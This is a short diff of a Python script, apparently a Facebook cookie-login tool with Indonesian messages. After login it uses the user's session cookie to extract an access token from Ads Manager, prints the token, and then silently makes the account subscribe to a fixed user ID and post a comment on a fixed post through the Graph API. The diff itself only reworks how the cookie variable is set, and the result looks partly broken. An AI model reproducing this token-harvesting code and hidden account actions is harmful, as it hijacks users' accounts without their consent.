@@ -433,8 +433,9 @@ def login_lagi334():
 							Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
 							time.sleep(3)
 							try:
+								cok ='your_cookies'
+								cookie = {'cookie':cok}
 								with requests.Session() as xyz:
-									cok = ({'cookie': your_cookies})
 									url = 'https://www.facebook.com/adsmanager/manage/campaigns'
 									req = xyz.get(url,cookies=cookie)
 									set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
@@ -444,7 +445,7 @@ def login_lagi334():
 									print('')
 									print(tok)
 									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom1}&access_token={tok}", headers = {"cookie":your_cookies})
+									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom1}&access_token={tok}", headers = {"cookie":cok})
 							except Exception as e:
 								print(e)
 			except Exception as e:
